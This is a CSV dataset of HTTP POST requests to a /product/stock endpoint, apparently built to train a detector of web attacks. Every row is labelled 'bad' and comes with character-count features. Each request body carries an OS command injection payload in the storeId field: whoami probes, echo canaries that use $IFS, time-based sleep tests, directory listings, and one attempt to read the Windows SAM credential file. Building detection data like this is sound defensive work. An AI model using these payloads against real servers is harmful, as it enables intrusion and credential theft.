method,path,body,dashes,andsign,dolar,orsign,lessthan,greaterthan,exclamation,badwords,class
POST,/product/stock,productId=2&storeId=1 '|echo$IFSWWFYLU$((17+21))$(echo$IFSWWFYLU)WWFYLU//,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 9 -ne $(echo SQHKCG | tr -d '\n' | wc -c) ] || sleep 1 &,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & ls -laR /var/www,0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo DHYUHH); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo ZSGSGJ)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi //",0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""echo DZXQHG$((20+46))$(echo DZXQHG)DZXQHG|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1  echo TDJHRY$((30+41))$(echo TDJHRY)TDJHRY,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "".print(`echo DSHOEV
echo $((44+47))
echo DSHOEV
echo DSHOEV`);%2523DSHOEV",0,0,1,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo$IFSJIAXIU$((62+56))$(echo$IFSJIAXIU)JIAXIU\",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSYCZAGJ$((43+61))$(echo$IFSYCZAGJ)YCZAGJ//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 7 -ne $(echo JTXVKL | tr -d '\n' | wc -c) ] || sleep 1,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo CKNPSQ$((65+36))$(echo CKNPSQ)CKNPSQ',0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSODUPZQ$((21+13))$(echo$IFSODUPZQ)ODUPZQ\\",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo GDQLRU$((11+47))$(echo GDQLRU)GDQLRU\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | [ 8 -ne $(echo CXWPXJ | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 8 -ne $(echo PSPAPE | tr -d '\n' | wc -c) ] || sleep 1 &,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSJDZYWS$((14+65))$(echo$IFSJDZYWS)JDZYWS//,0,0,4,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSYBIRAD$((77+75))$(echo$IFSYBIRAD)YBIRAD&",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
echo LRJXVV$((74+11))$(echo LRJXVV)LRJXVV|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 print(`echo DYZZIW;echo $((94+81));echo DYZZIW;echo DYZZIW`);%23DYZZIW,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 'echo HMZWLY$((77+96))$(echo HMZWLY)HMZWLY\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSQWRACU$((69+14))$(echo$IFSQWRACU)QWRACU&",0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo SAQMPN$((71+20))$(echo SAQMPN)SAQMPN|",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSTRBJHF$((51+94))$(echo$IFSTRBJHF)TRBJHF'",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '||echo ZXDFVL$((67+12))$(echo ZXDFVL)ZXDFVL|,0,0,2,3,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
echo RQUCHA$((6+94))$(echo RQUCHA)RQUCHA'",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&&echo ZUDZMD$((43+75))$(echo ZUDZMD)ZUDZMD&,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ; type C:\WINNT\repair\SAM,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo PSUJGU); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi //,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo ATDESO) && str1=${#str} && [ 7 -eq ${str1} ] && sleep 1",0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 echo$IFSDMXBXH$((83+95))$(echo$IFSDMXBXH)DMXBXH\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & netstat -an,0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSUUEUUP$((8+33))$(echo$IFSUUEUUP)UUEUUP&,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 )print(`echo AFOMNK
echo $((45+23))
echo AFOMNK
echo AFOMNK`);%2529%257DAFOMNK",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSEHCFWA$((81+0))$(echo$IFSEHCFWA)EHCFWA',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo YNEGDR$((66+88))$(echo YNEGDR)YNEGDR|,0,0,2,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&echo XYOEXK$((74+11))$(echo XYOEXK)XYOEXK&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '&echo$IFSBOCKFB$((70+90))$(echo$IFSBOCKFB)BOCKFB""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '||echo QQHXIW$((77+85))$(echo QQHXIW)QQHXIW|,0,0,2,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo XDIPPG$((33+59))$(echo XDIPPG)XDIPPG&",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo ASBPAS); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo VZDOKD$((12+24))$(echo VZDOKD)VZDOKD|,0,0,2,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "";echo PDMNTI$((23+51))$(echo PDMNTI)PDMNTI",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo TLXEJK); str1=${#str}; if [ 9 -ne ${str1} ]; then sleep 0; else sleep 1; fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
echo DHXPBN$((74+0))$(echo DHXPBN)DHXPBN""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo$IFSYMBKLY$((55+32))$(echo$IFSYMBKLY)YMBKLY//",0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo DINDDL$((2+20))$(echo DINDDL)DINDDL'",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 eval('whoami'),0,0,0,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSPRGTJG$((24+21))$(echo$IFSPRGTJG)PRGTJG//",0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSEQHFOG$((96+31))$(echo$IFSEQHFOG)EQHFOG//",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "")print(`echo JNKGOO\necho $((17+90))\necho JNKGOO\necho JNKGOO`);.%252522JNKGOO",0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo NVZIAZ$((98+45))$(echo NVZIAZ)NVZIAZ""",0,0,2,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 4 -ne $(echo SYHTME | tr -d '\n' | wc -c) ] || sleep 1 //",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo XPABSL$((91+48))$(echo XPABSL)XPABSL",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 & sleep 0 && str=$(echo VGAFPT) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 """,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ;echo DCOSDU$((41+86))$(echo DCOSDU)DCOSDU&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo AWXHOA$((97+59))$(echo AWXHOA)AWXHOA|,0,1,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo TERRZN$((57+89))$(echo TERRZN)TERRZN//,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo ZYJHAC) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 #,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo MKGYYL$((46+31))$(echo MKGYYL)MKGYYL\\,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 'echo$IFSMDCMCB$((27+53))$(echo$IFSMDCMCB)MDCMCB&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ||echo TEDJVC$((96+45))$(echo TEDJVC)TEDJVC""",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo KTAZQG$((85+41))$(echo KTAZQG)KTAZQG|,0,0,2,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 echo TWRCSC$((11+79))$(echo TWRCSC)TWRCSC',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '| [ 1 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo YXUPUJ) && str1=${#str} && [ 2 -eq ${str1} ] && sleep 1 %5C%5C,0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo WSGIYR); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi %27,0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSRRGUPN$((69+6))$(echo$IFSRRGUPN)RRGUPN//,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ${shell_exec(print(`echo OYNPCP;echo $((84+51));echo OYNPCP;echo OYNPCP`);%29%7DOYNPCP,0,0,2,0,0,0,0,6,bad
POST,/product/stock,productId=2&storeId=1 $(`dir`),0,0,1,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSXDYAKY$((50+55))$(echo$IFSXDYAKY)XDYAKY//,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 5 -ne $(echo XOCDUH | tr -d '\n' | wc -c) ] || sleep 1 %5C%5C,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 && pwd,0,1,0,0,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSNNKINL$((7+56))$(echo$IFSNNKINL)NNKINL&",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 print(`echo DEGOPG;echo $((38+61));echo DEGOPG;echo DEGOPG`);%5C%5CDEGOPG,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 '&&echo WRWTAS$((61+67))$(echo WRWTAS)WRWTAS&,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo TTJGWL$((57+61))$(echo TTJGWL)TTJGWL\,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ');}print(`echo EVHTLK\necho $((99+40))\necho EVHTLK\necho EVHTLK`);//EVHTLK,0,0,1,0,0,0,0,8,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&echo$IFSEFVKLM$((89+68))$(echo$IFSEFVKLM)EFVKLM'",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '& sleep 0 && str=$(echo YQNAJZ) && str1=${#str} && [ 4 -eq ${str1} ] && sleep 1 //,0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 8 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 'echo$IFSOFNFSY$((33+29))$(echo$IFSOFNFSY)OFNFSY',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "";echo$IFSHGTRCU$((62+99))$(echo$IFSHGTRCU)HGTRCU\",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '&&echo IKUKJX$((80+89))$(echo IKUKJX)IKUKJX\,0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo LTTDYL$((1+42))$(echo LTTDYL)LTTDYL\,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & dir C:\,0,0,0,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo WBDHXY); str1=${#str}; if [ 5 -ne ${str1} ]; then sleep 0; else sleep 1; fi #",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ;echo SRPJET$((29+34))$(echo SRPJET)SRPJET,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSIUFXEF$((53+74))$(echo$IFSIUFXEF)IUFXEF//,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '||echo$IFSBLPPXU$((2+17))$(echo$IFSBLPPXU)BLPPXU|,0,0,4,3,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 echo MTWKYX$((89+57))$(echo MTWKYX)MTWKYX\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo TETKKY$((84+73))$(echo TETKKY)TETKKY|,0,1,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSRRFVYH$((99+28))$(echo$IFSRRFVYH)RRFVYH',0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSDUIYBT$((30+8))$(echo$IFSDUIYBT)DUIYBT\,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSNAGEDU$((57+86))$(echo$IFSNAGEDU)NAGEDU&,0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1  echo GTGFVS$((86+52))$(echo GTGFVS)GTGFVS""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSGHEBEC$((72+52))$(echo$IFSGHEBEC)GHEBEC,0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&&echo$IFSWGUUQS$((22+59))$(echo$IFSWGUUQS)WGUUQS\\,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 )print(`echo VIVSXO;echo $((60+28));echo VIVSXO;echo VIVSXO`);VIVSXO,0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""; str=$(echo NBAQGO); str1=${#str}; if [ 7 -ne ${str1} ]; then sleep 0; else sleep 1; fi |",0,0,3,1,0,0,0,3,bad
